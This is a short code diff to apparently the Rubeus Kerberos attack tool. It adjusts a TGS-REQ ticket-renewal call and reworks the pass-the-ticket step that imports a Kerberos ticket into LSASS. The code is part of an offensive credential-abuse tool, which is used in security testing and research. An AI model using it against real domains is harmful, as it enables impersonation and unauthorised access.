@@ -79,8 +79,8 @@ namespace Rubeus
             {
                 Console.WriteLine("[*] Building TGS-REQ renewal for: '{0}\\{1}'", domain, userName);
             }
-            
-            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, "krbtgt", providedTicket, clientKey, etype, true);
+
+            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, "krbtgt", providedTicket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, true, "");
 
             byte[] response = Networking.SendBytes(dcIP.ToString(), 88, tgsBytes);
             if(response == null)
@@ -165,17 +165,13 @@ namespace Rubeus
                     {
                         Console.WriteLine("      {0}", line);
                     }
-                    if (ptt)
-                    {
-                        // pass-the-ticket -> import into LSASS
-                        LSA.ImportTicket(kirbiBytes);
-                    }
-                    return kirbiBytes;
                 }
-                else
+                if (ptt)
                 {
-                    return kirbiBytes;
+                    // pass-the-ticket -> import into LSASS
+                    LSA.ImportTicket(kirbiBytes, new Interop.LUID());
                 }
+                return kirbiBytes;
             }
             else if (responseTag == 30)
             {
